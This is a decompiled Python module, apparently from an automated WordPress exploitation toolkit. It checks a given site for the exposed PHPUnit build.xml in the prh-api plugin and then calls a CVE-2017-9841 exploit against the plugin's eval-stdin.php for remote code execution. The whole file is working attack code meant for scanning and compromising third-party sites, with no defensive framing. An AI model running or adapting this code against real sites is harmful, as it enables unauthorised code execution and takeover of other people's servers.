# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\Wp_prh_api.py
import requests
from Exploits import printModule
from Exploits import CVE_2017_9841PHPUnit
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'
   }

def Exploit(site):
    try:
        vv = site + '/wp-content/plugins/prh-api/vendor/phpunit/phpunit/build.xml'
        Exp = '/wp-content/plugins/prh-api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        CheckVuln = requests.get('http://{}'.format(vv), timeout=10, headers=Headers)
        if 'taskname="phpunit"' in str(CheckVuln.content):
            return CVE_2017_9841PHPUnit.Exploit(site, Exp, 'prh-api', 'Wordpress')
        return printModule.returnNo(site, 'CVE-2017-9841', 'PHPUnit prh-api', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2017-9841', 'PHPUnit prh-api', 'Wordpress')